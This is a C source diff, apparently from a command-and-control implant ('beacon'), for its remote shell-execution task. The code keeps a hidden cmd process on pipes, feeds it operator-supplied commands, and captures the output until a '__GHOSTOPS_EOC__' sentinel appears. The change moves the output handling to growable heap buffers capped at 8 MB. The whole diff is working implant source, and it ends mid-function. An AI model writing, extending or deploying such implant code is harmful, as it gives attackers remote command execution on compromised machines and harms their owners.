@@ -6,6 +6,7 @@
 #define SENTINEL_CMD    "echo " SENTINEL "\r\n"
 #define TIMEOUT_MS      30000
 #define POLL_MS         50
+#define SHELL_OUT_MAX   (8u * 1024u * 1024u)   /* 8 MB growth cap */
 
 static HANDLE g_hProc    = NULL;
 static HANDLE g_hStdinW  = NULL;
@@ -21,7 +22,10 @@ static BOOL shell_alive(void) {
     return g_hProc && WaitForSingleObject(g_hProc, 0) == WAIT_TIMEOUT;
 }
 
-static DWORD shell_read_sentinel(char *buf, DWORD buf_sz, DWORD timeout_ms) {
+/* Read stdout into a growable heap buffer until SENTINEL or timeout.
+   *buf and *cap are updated if the buffer is reallocated.
+   Returns total bytes written (buffer is NUL-terminated). */
+static DWORD shell_read_sentinel(char **buf, DWORD *cap, DWORD timeout_ms) {
     DWORD total    = 0;
     DWORD deadline = GetTickCount() + timeout_ms;
 
@@ -30,16 +34,28 @@ static DWORD shell_read_sentinel(char *buf, DWORD buf_sz, DWORD timeout_ms) {
         if (!PeekNamedPipe(g_hStdoutR, NULL, 0, NULL, &avail, NULL)) break;
         if (avail == 0) { Sleep(POLL_MS); continue; }
 
+        /* grow buffer if needed, respecting hard cap */
+        if (total + avail + 1 > *cap) {
+            DWORD new_cap = *cap;
+            while (new_cap < total + avail + 1) new_cap *= 2;
+            if (new_cap > SHELL_OUT_MAX) new_cap = SHELL_OUT_MAX;
+            if (new_cap <= *cap) break; /* already at cap */
+            char *tmp = (char *)HeapReAlloc(GetProcessHeap(), 0, *buf, new_cap);
+            if (!tmp) break;
+            *buf = tmp;
+            *cap = new_cap;
+        }
+
         DWORD chunk = avail;
-        if (total + chunk >= buf_sz - 1) chunk = buf_sz - 1 - total;
+        if (total + chunk + 1 > *cap) chunk = *cap - total - 1;
         if (chunk == 0) break;
 
         DWORD nread = 0;
-        if (!ReadFile(g_hStdoutR, buf + total, chunk, &nread, NULL) || nread == 0) break;
+        if (!ReadFile(g_hStdoutR, *buf + total, chunk, &nread, NULL) || nread == 0) break;
         total += nread;
-        buf[total] = '\0';
+        (*buf)[total] = '\0';
 
-        if (strstr(buf, SENTINEL)) break;
+        if (strstr(*buf, SENTINEL)) break;
     }
     return total;
 }
@@ -77,7 +93,6 @@ static BOOL shell_spawn(void) {
 
     g_hProc = pi.hProcess;
     CloseHandle(pi.hThread);
-
     CloseHandle(hStdinR);
     CloseHandle(hStdoutW);
 
@@ -85,8 +100,13 @@ static BOOL shell_spawn(void) {
     DWORD w = 0;
     WriteFile(g_hStdinW, init, (DWORD)strlen(init), &w, NULL);
 
-    char drain[4096];
-    shell_read_sentinel(drain, sizeof(drain), 5000);
+    /* drain banner using a temporary heap buffer */
+    DWORD drain_cap = 4096;
+    char *drain = (char *)HeapAlloc(GetProcessHeap(), 0, drain_cap);
+    if (drain) {
+        shell_read_sentinel(&drain, &drain_cap, 5000);
+        HeapFree(GetProcessHeap(), 0, drain);
+    }
     return TRUE;
 
 fail:
@@ -103,6 +123,7 @@ static void shell_ensure(void) {
     }
 }
 
+/* ── task entry point ───────────────────────────────────── */
 void beacon_exec_shell(BEACON_CTX *ctx, PARSED_TASK *task, TASK_RESULT *result) {
     (void)ctx;
 
@@ -113,13 +134,26 @@ void beacon_exec_shell(BEACON_CTX *ctx, PARSED_TASK *task, TASK_RESULT *result) 
         return;
     }
 
-    char line[sizeof(task->args) + 32];
-    int  line_len = snprintf(line, sizeof(line), "%s\r\n" SENTINEL_CMD, task->args);
+    const char *cmd    = task->args ? task->args : "";
+    DWORD       cmd_ln = task->args ? (DWORD)task->args_len : 0;
+
+    /* build: <cmd>\r\necho __GHOSTOPS_EOC__\r\n */
+    DWORD line_sz = cmd_ln + (DWORD)sizeof(SENTINEL_CMD) + 4;
+    char *line = (char *)HeapAlloc(GetProcessHeap(), 0, line_sz);
+    if (!line) {
+        snprintf(result->error, sizeof(result->error), "out of memory");
+        return;
+    }
+    int line_len = snprintf(line, line_sz, "%s\r\n" SENTINEL_CMD, cmd);
+
     DWORD written = 0;
     WriteFile(g_hStdinW, line, (DWORD)line_len, &written, NULL);
+    HeapFree(GetProcessHeap(), 0, line);
 
-    DWORD total = shell_read_sentinel(result->output, result->output_cap, TIMEOUT_MS);
+    /* read output — buffer grows dynamically up to SHELL_OUT_MAX */
+    DWORD total = shell_read_sentinel(&result->output, &result->output_cap, TIMEOUT_MS);
 
+    /* strip sentinel line and trailing whitespace */
     char *pos = strstr(result->output, SENTINEL);
     if (pos) {
         char *sol = pos;
